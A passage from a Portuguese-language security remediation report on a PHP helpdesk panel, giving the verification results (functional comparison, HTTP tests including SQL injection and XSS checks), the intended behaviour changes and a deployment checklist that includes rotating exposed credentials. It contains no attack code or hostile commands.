## 4. Verificação e implantação

**Como verifiquei.** Subi um MariaDB 11.8 próprio (somente socket Unix) com `schema.sql` + `seed.sql`, e rodei PHP 8.4.26 com o código original e o novo lado a lado, nos dois schemas (`CHAR(32)` original e `VARCHAR(255)` novo). O MariaDB do sistema na porta 3306 não foi tocado.

| Verificação | Resultado |
| --- | --- |
| Comparação funcional original x novo (110 chamadas à lib: valores, tipos, ordem, CSV, avisos do PHP) | só 3 diferenças, todas intencionais: busca com `'` deixou de dar exceção; sumiram os `Deprecated` do `fputcsv`; o export caiu de 5 SELECTs para 1 |
| Assinaturas das 7 funções do manifesto (+ `tecnicoNome`) via Reflection | idênticas |
| `rotuloPrioridade`, 72 combinações; `formatarStatus`, -1 a 5 | idênticos ao original |
| HTTP: 75 asserções (login, visibilidade de 4 usuários x 5 chamados, busca, SQLi, XSS, sessão, CSV, estrutura HTML) | 75/75 em cada schema |
| Páginas e CSV dos técnicos, byte a byte contra o original | idênticos (listagem, detalhes, CSV) |
| Cenários de borda: sem chamados respondidos, tabela vazia, títulos hostis, modo SQL não estrito, usuário do banco sem UPDATE, 48 exports simultâneos, falha de conexão | todos conforme o esperado (ver F7, F9, F11, F15, F17) |

**Mudanças de comportamento observáveis (todas intencionais):** clientes passam a ver só os seus chamados (listagem, detalhe e CSV); `?ver=` inexistente ou alheio responde 404; `busca` com aspa e `login[]`/`busca[]` não dão mais 500; títulos de CSV iniciados por `= + - @` ganham um `'` na frente; `mediaResposta` devolve `0.0` sem amostras em vez de erro fatal; `exportarCsv` não grava mais `EXPORT_DIR/chamados.csv`.

**Lista de implantação.**
1. Definir `DB_PASS` (e `SMTP_API_KEY`, se algum script a usa) no ambiente do PHP antes do deploy: sem a senha o painel responde 500 de propósito.
2. Rotacionar a senha do banco e revogar a chave SMTP: ambas estiveram em texto claro e continuam válidas até serem trocadas.
3. `ALTER TABLE usuarios MODIFY senha VARCHAR(255) NOT NULL;` Sem isso nada quebra, só não há migração dos hashes (o código detecta a coluna estreita e não grava).
4. Se a rotina noturna lê `EXPORT_DIR/chamados.csv`, mudar para capturar a saída de `exportarCsv()`; apagar o `chamados.csv` antigo e impedir que `/var/www/painel/tmp` seja servido pela web.
5. Sessões abertas antes do deploy continuam válidas. Considerar limite de tentativas de login e cabeçalhos de segurança no servidor web (seção 3).

**Limites desta verificação.** Banco: MariaDB 11.8, não MySQL 8 (o SQL usado é padrão). PHP: só 8.4 foi executado; o código novo usa apenas sintaxe do PHP 7.1+ (como o original), mas não rodei em 7.x. O `.leb-pacote.sha256` deixou de bater com `code/` porque os arquivos foram alterados, como esperado. Não avaliei a configuração real do servidor web (relevante para F9) nem o conteúdo da produção.
